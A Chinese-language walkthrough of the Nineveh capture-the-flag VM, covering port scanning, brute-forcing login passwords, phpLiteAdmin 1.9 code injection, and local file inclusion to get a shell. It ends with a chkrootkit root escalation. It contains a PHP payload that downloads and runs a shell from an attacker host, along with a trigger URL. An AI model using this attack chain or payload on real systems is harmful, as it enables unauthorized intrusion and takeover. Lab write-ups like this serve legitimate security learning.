> 原文链接: https://www.anquanke.com//post/id/104336 


# 渗透测试实战-Nineveh靶机测试


                                阅读量   
                                **435094**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">28</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t014bfc16c5b7cad282.jpg)](https://p5.ssl.qhimg.com/t014bfc16c5b7cad282.jpg)

## # 前言

该靶机原本是某个在线CTF平台的解题靶机，国外大神不知使用什么姿势把OVA发布在了某平台上，被本菜下载来了。通过介绍得知本靶机以拿到**/root/root.txt**文件为完成。

## 准备环境

VirtualBox 192.168.1.51<br>
kali linux 192.168.1.101<br>
ova靶机下载地址： [https://pan.baidu.com/s/1mD5a3AIFRJ-JmTleu0W0qg](https://pan.baidu.com/s/1mD5a3AIFRJ-JmTleu0W0qg)<br>**注：本机系统内已默认写入IP“192.168.0.105”，如有需要就自行修改IP**（本菜是修改了IP）<br>[![](https://p4.ssl.qhimg.com/t01f91a972f256d613b.png)](https://p4.ssl.qhimg.com/t01f91a972f256d613b.png)

## 实操

神器nmap开路<br>[![](https://p0.ssl.qhimg.com/t0155d234cb5cf6b972.png)](https://p0.ssl.qhimg.com/t0155d234cb5cf6b972.png)

发现只开放了80、443 2个端口，我们访问443端口，老规矩看证书，里面肯定有包含特殊信息：“[admin@nineveh.htb](mailto:admin@nineveh.htb)”，如图：<br>[![](https://p5.ssl.qhimg.com/t012ac4b064c068c36d.png)](https://p5.ssl.qhimg.com/t012ac4b064c068c36d.png)<br>
通过证书，只有一张图片，那我们进行用爆破工具跑一下，如御剑等等，本菜用dirb<br>[![](https://p2.ssl.qhimg.com/t018a5ede3d4797c1eb.png)](https://p2.ssl.qhimg.com/t018a5ede3d4797c1eb.png)<br>
访问/db/ 发现使用phpliteadmin v1.9 这么明显标示的肯定是有问题的，不用怀疑google搜一波,发现存在远程命令执行漏洞<br>[![](https://p4.ssl.qhimg.com/t0165856caf776e518a.png)](https://p4.ssl.qhimg.com/t0165856caf776e518a.png)<br>
根据要求我们需要创建一个数据库，那么前提就算破解这个密码了，上burp,加载上字典这波操作过于简单，小弟就不放图浪费大佬们时间了，得到密码为：**password123**

登录成功后按照漏洞资料上的操作,先创建一个名为“ninevehNotes1.php”的数据库（为什么要用这个名字纳，后面会提到！） 表名处随便添，在最后执行语句中可以添加自己常用的马，本菜使用msf的php马，如&lt;?php system(“wget [http://192.168.1.101/shell.txt](http://192.168.1.101/shell.txt) -O /tmp/shell11.php; php /tmp/shell11.php”); ?&gt;<br>[![](https://p4.ssl.qhimg.com/t01ee18c38524cadb16.png)](https://p4.ssl.qhimg.com/t01ee18c38524cadb16.png)<br>
一切准备就绪，我们还差一个能触发的点，我们继续回到80端口，还是一样开启神器爆破目录<br>[![](https://p4.ssl.qhimg.com/t01241ed85b6a52f68d.png)](https://p4.ssl.qhimg.com/t01241ed85b6a52f68d.png)<br>
发现目录访问 [http://192.168.1.51/department/](http://192.168.1.51/department/) 简单测试知道帐号为admin（标示明显）<br>[![](https://p5.ssl.qhimg.com/t01bc28483b46eab527.png)](https://p5.ssl.qhimg.com/t01bc28483b46eab527.png)<br>
密码进行挂上字典爆破 **得到密码： 1q2w3e4r5t**<br>[![](https://p5.ssl.qhimg.com/t014ec87e29f953bf52.png)](https://p5.ssl.qhimg.com/t014ec87e29f953bf52.png)<br>
登录在[http://192.168.1.51/department/manage.php?notes=files/ninevehNotes.txt](http://192.168.1.51/department/manage.php?notes=files/ninevehNotes.txt) 是一个简单任意文件读取，但是这里的读取文件是被写入白名单里的，就是它只能读取结尾带‘ninevehNotes’的文件，测试如图：<br>[![](https://p4.ssl.qhimg.com/t0141fd8ad0da9c1c03.png)](https://p4.ssl.qhimg.com/t0141fd8ad0da9c1c03.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014ddbbba90440c9f9.png)<br>
我们用这个配合上前面的漏洞执行拿shell<br>
POC：<br>**[http://192.168.1.51/department/manage.php?notes=/var/tmp/ninevehNotes1.php](http://192.168.1.51/department/manage.php?notes=/var/tmp/ninevehNotes1.php)**<br>[![](https://p5.ssl.qhimg.com/t01a610ced0db4bd78c.png)](https://p5.ssl.qhimg.com/t01a610ced0db4bd78c.png)<br>
但是这个权限还算不够的，我们只能通过提权做进一步操作。大家肯定都直接想到脏牛提权了，但是本靶机没有这个漏洞，本菜在进行磁盘查看的时候，发现一个叫“/report”的文件夹，通过查看里面的文件发现是一个rootkit检测工具的实时报告文件，如图<br>[![](https://p1.ssl.qhimg.com/t010c778f6d57c4155e.png)](https://p1.ssl.qhimg.com/t010c778f6d57c4155e.png)<br>
本菜使用比较笨的方法，就是把所知道的关于rookit的检测工具都进行全盘搜索，最后定位到使用了“chkrootkit”，<br>[![](https://p0.ssl.qhimg.com/t01644341018a70ddb7.png)](https://p0.ssl.qhimg.com/t01644341018a70ddb7.png)<br>
通过查看其版本号和配置信息结合google搜索，发现一个本地提权漏洞，而MSF也已经有该利用脚本，如图：<br>[![](https://p3.ssl.qhimg.com/t012f57a6c9c52c5790.png)](https://p3.ssl.qhimg.com/t012f57a6c9c52c5790.png)

通过该漏洞最终拿下来root权限并得到flag：<br>[![](https://p1.ssl.qhimg.com/t017a19743ebb854204.png)](https://p1.ssl.qhimg.com/t017a19743ebb854204.png)

本靶机还可以通过获取ssh key 来提权，ssh key写在一个名叫“nineveh.png”图片内，如图：<br>[![](https://p2.ssl.qhimg.com/t011d57c668b5a19d8e.png)](https://p2.ssl.qhimg.com/t011d57c668b5a19d8e.png)<br>
有兴趣的小伙伴可以自己研究一下。

**如果哪里写的不对，望清各位大佬斧正！感谢各位观看！**
